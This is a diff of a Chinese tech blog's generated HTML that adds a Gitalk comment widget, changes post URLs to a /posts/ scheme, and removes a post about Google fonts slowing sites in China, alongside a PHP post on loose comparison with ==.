+		var gitalkConfig = {"clientID":"8fffdd9e888794e7cafb","clientSecret":{"gitalk-github-client-secret":null},"repo":"veitor.github.io","owner":"Veitor","admin":["Veitor"],"distractionFreeMode":false};
+	    gitalkConfig.id = md5(location.pathname);
+		var gitalk = new Gitalk(gitalkConfig);
+	    gitalk.render("gitalk-container");
+	    </script>
       
     </div>
 
@@ -869,7 +1082,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://www.veitor.net/2014/06/24/php-e4-b8-ad-e6-85-8e-e7-94-a8-e5-8f-8c-e7-ad-89-e4-ba-8e/">
+    <link itemprop="mainEntityOfPage" href="http://www.veitor.net/posts/php-e4-b8-ad-e6-85-8e-e7-94-a8-e5-8f-8c-e7-ad-89-e4-ba-8e/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/avatar.jpg">
@@ -883,7 +1096,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2014/06/24/php-e4-b8-ad-e6-85-8e-e7-94-a8-e5-8f-8c-e7-ad-89-e4-ba-8e/" class="post-title-link" itemprop="url">PHP中慎用双等于(==)</a>
+            <a href="/posts/php-e4-b8-ad-e6-85-8e-e7-94-a8-e5-8f-8c-e7-ad-89-e4-ba-8e/" class="post-title-link" itemprop="url">PHP中慎用双等于(==)</a>
         </h2>
 
         <div class="post-meta">
@@ -900,7 +1113,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2019-12-03 22:56:03" itemprop="dateModified" datetime="2019-12-03T22:56:03+08:00">2019-12-03</time>
+                <time title="修改时间：2019-12-04 22:46:27" itemprop="dateModified" datetime="2019-12-04T22:46:27+08:00">2019-12-04</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -927,82 +1140,15 @@
       
           <p>PHP比较运算符出现的频率实在是太高了，尤其是 == if(a == b){ // do something } 但是，你真的掌握了 == 了吗？细节很重要！ 来看下面的代码，说出你认为正确的答案 var_dump(‘  123fg456’==123); var_dump(‘some string’ == 0); var_dump(123.0 == ‘123d456’); var_dump(0 == “a”); var_dump(“1” == “01”); var_dump(“1” == “1e0”); 先想出你的答案，然后再运行一次看看。如果答案没有差错，那么恭喜你，基础知识很扎实。 <strong>解释：</strong> 如果比较一个整数和字符串，则字符串会被转换为整数。如果比较两个数字字符串，则作为整数比较。此规则也适用于 switch 语句。 特别注意，字符串转换为整数时，是从左到右，直到遇到非数字字符为止。也就是说 ‘123abc456’ 会被转换成 123，而不是 123456。另外字符串开始的空格会被忽略，比如 ‘   234abc’ 转换为 234。 <strong>下面附上松散比较和严格比较的对照表</strong> <a href="http://storage.veitor.net/uploads/2014/06/201306061156212.png" target="_blank" rel="noopener"><img src="http://storage.veitor.net/uploads/2014/06/201306061156212.png" alt="201306061156212"></a></p>
 
-      
-    </div>
+<div id="gitalk-container"></div>
+<script src="https://cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script><link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css"><script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
 
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://www.veitor.net/2014/06/24/e8-b0-b7-e6-ad-8c-e6-9c-8d-e5-8a-a1-e8-a2-ab-e5-b0-81-e7-bd-91-e7-ab-99-e5-8a-a0-e8-bd-bd-e5-8f-98-e6-85-a2/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/avatar.jpg">
-      <meta itemprop="name" content="Veitor">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Veitor的技术点滴">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2014/06/24/e8-b0-b7-e6-ad-8c-e6-9c-8d-e5-8a-a1-e8-a2-ab-e5-b0-81-e7-bd-91-e7-ab-99-e5-8a-a0-e8-bd-bd-e5-8f-98-e6-85-a2/" class="post-title-link" itemprop="url">谷歌服务被“封” 网站加载变慢</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2014-06-24 09:00:32" itemprop="dateCreated datePublished" datetime="2014-06-24T09:00:32+08:00">2014-06-24</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2019-12-03 22:56:03" itemprop="dateModified" datetime="2019-12-03T22:56:03+08:00">2019-12-03</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E7%A8%8B%E5%BA%8F%E4%B8%8E%E7%94%9F%E6%B4%BB/" itemprop="url" rel="index">
-                    <span itemprop="name">程序与生活</span>
-                  </a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p><a href="http://storage.veitor.net/uploads/2014/06/1402017825583.jpg" target="_blank" rel="noopener"><img src="http://storage.veitor.net/uploads/2014/06/1402017825583.jpg" alt="1402017825583"></a> 从5月27号左右开始，谷歌(Google)在华的几乎所有的服务都处于无法使用的状态，谷歌官网域名Google.com、谷歌香港 Google.com.hk所有服务都打不开。ping出来的IP均显示为“美国”，也就是说谷歌香港的服务器，已经由香港转移至美国，所以链接实际会很 长，甚至断断续续出现请求超时的情况。 当时我的博客所在的SAE也有点小故障，所以那几天我的博客一直访问很慢，我以为是SAE的问题，结果后来终于发现博客的几个页面加载了google的字体资源，所以导致网站加载特别缓慢，现在终于解决了。 360网站卫士的解决方案： 修改方法如下： 打开wordpress代码中的文件wp-includes/script-loader.php文件，搜索：fonts.googleapis.com找到这行代码： $open_sans_font_url = “//fonts.googleapis.com/css?family1=Open+Sans:300italic,400italic,600italic,300,400,600&amp;subset=$subsets”; 把fonts.googleapis.com替换为fonts.useso.com 修改完保存，再次刷新，大家就可以发现，自己的网站速度已经比以前快了很多，几乎瞬间就可以拿到Google字体了。原因就是本来需要从美国服务器才能拿到的google字体，现在已经遍布360全国的机房了。 醒妹网的解决方案： 既然是关于Google字体，那解除字体问题就可以了。如果网页中设定的字体无法加载，那么网页会按照浏览器默认的字体显示。但浏览器并不知道Google字体服务被屏蔽了，还那么二的一直加载，直到加载失败。但这个过程会耗费十几秒的时间。 **　　WordPress网站解决Google字体的办法：** 第一种方法：安装Disable Google Font插件，但经过测试之后，没有明显效果。 第二种方法：注释或删除掉style.css和function.php有关加载Google字体的代码fonts.googleapis.com即可。 当然以上两种方法可以同时使用。 如果在更改style.css或function.php文件之后，wordpress网站报错，无法打开，或者新建文章时上传图片失败。一定是将wordpress文件的编码保存为非ANSI编码，用记事本打开，保存时选择编码ANSI替换掉原来的文件即可。</p>
-
+		<script>
+		var gitalkConfig = {"clientID":"8fffdd9e888794e7cafb","clientSecret":{"gitalk-github-client-secret":null},"repo":"veitor.github.io","owner":"Veitor","admin":["Veitor"],"distractionFreeMode":false};
+	    gitalkConfig.id = md5(location.pathname);
+		var gitalk = new Gitalk(gitalkConfig);
+	    gitalk.render("gitalk-container");
+	    </script>
       
     </div>
 
@@ -1066,7 +1212,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
           <a href="/archives">
-          <span class="site-state-item-count">79</span>
+          <span class="site-state-item-count">80</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
